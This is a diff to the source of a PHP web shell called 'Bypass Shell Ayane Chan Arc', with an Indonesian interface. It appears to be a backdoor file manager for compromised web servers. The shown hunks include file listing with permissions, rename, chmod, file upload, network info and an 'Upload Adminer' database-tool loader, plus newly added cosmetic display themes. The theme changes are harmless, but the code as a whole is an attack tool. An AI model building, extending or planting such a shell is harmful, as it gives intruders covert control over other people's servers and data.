@@ -156,10 +156,8 @@ function display_path_links($dir) {
             $isRoot = $folderPath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
             echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<a href='?dir=$encodedPath' class='btn btn-link'>$folder/</a>";
-            echo "<span class='ml-auto'>|</span>";
+            echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . wordwrap($folder, 15, "<br>", true) . "/</a>";
             echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
-            echo "<span class='ml-auto'>|</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
             echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$folder')\">Ubah Chmod</button>";
@@ -230,10 +228,8 @@ function display_path_links($dir) {
             $isRoot = $filePath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
             echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<span>$file</span>";
-            echo "<span class='ml-auto'> | </span>";
+            echo "<span>" . wordwrap($file, 15, "<br>", true) . "</span>";
             echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
-            echo "<span class='ml-auto'> | </span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
             echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$file')\">Ubah Chmod</button>";
@@ -529,6 +525,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
     <style>
         body {
             min-width: 1024px;
+            transition: background-color 0.5s, color 0.5s;
         }
 
         .form-popup {
@@ -591,7 +588,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         }
     </style>
 </head>
-<body style="background-color: pink;">
+<body id="body" style="background-color: pink;">
     <div class="container mt-5">
         <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
         <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
@@ -605,6 +602,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             <button class="btn btn-primary" onclick="toggleInfoSites()">Informasi Web</button>
             <button class="btn btn-secondary" onclick="toggleNetworkInfo()">Network Info</button>
             <button class="btn btn-info" onclick="showForm('adminer-upload')">Upload Adminer</button>
+            <button class="btn btn-warning" onclick="toggleDisplayMode()">Tampilan</button>
         </div>
 
         <!-- Form Upload Adminer -->
@@ -629,6 +627,19 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             <?php displayNetworkInfo(); ?>
         </div>
 
+        <!-- Pilihan Tampilan -->
+        <div id="display-mode" class="form-popup">
+            <form class="form-container">
+                <h4>Pilih Tampilan</h4>
+                <button type="button" class="btn btn-primary" onclick="setDisplayMode('normal')">Normal</button>
+                <button type="button" class="btn btn-dark" onclick="setDisplayMode('dark')">Mode Gelap</button>
+                <button type="button" class="btn btn-success" onclick="setDisplayMode('eye-comfort')">Anti Sakit Mata</button>
+                <button type="button" class="btn btn-info" onclick="setDisplayMode('rgb')">RGB</button>
+                <button type="button" class="btn btn-success" onclick="setDisplayMode('elegant')">Elegan</button>
+                <button type="button" class="btn btn-secondary mt-3" onclick="hideForm('display-mode')">Batal</button>
+            </form>
+        </div>
+
         <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
         <form method="post">
             <div class="form-group">
@@ -649,22 +660,6 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         </form>
 
         <h2 class="mt-4">Daftar Direktori</h2>
-        <div class="alert alert-info">
-            <strong>Direktori Saat Ini:</strong> 
-            <a href="?dir=<?php echo urlencode(base64_encode($rootDir)); ?>" class="btn btn-link">Home</a> 
-            <?php
-            $currentPath = '/';
-            echo "<a href='?dir=" . urlencode(base64_encode('/')) . "' class='btn btn-link'>/</a> ";
-            foreach ($dirArray as $index => $folder) {
-                $currentPath .= htmlspecialchars($folder) . '/';
-                $encodedPath = urlencode(base64_encode($currentPath));
-                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
-                if ($index < count($dirArray) - 1) {
-                    echo " / ";
-                }
-            }
-            ?>
-        </div>
         <div class="list-group">
             <?php
             display_path_links($dir);
@@ -718,6 +713,31 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             } else {
                 input.style.display = "none";
             }
+        }
+
+        function toggleDisplayMode() {
+            showForm('display-mode');
+        }
+
+        function setDisplayMode(mode) {
+            var body = document.getElementById('body');
+            if (mode === 'normal') {
+                body.style.backgroundColor = 'pink';
+                body.style.color = 'black';
+            } else if (mode === 'dark') {
+                body.style.backgroundColor = '#333';
+                body.style.color = 'white';
+            } else if (mode === 'eye-comfort') {
+                body.style.backgroundColor = '#f0e68c';
+                body.style.color = '#2e2e2e';
+            } else if (mode === 'rgb') {
+                body.style.backgroundColor = 'linear-gradient(90deg, rgba(255,0,0,1) 0%, rgba(0,255,4,1) 50%, rgba(0,0,255,1) 100%)';
+                body.style.color = 'white';
+            } else if (mode === 'elegant') {
+                body.style.backgroundColor = '#2f4f4f';
+                body.style.color = '#daa520';
+            }
+            hideForm('display-mode');
         }
     </script>
 </body>
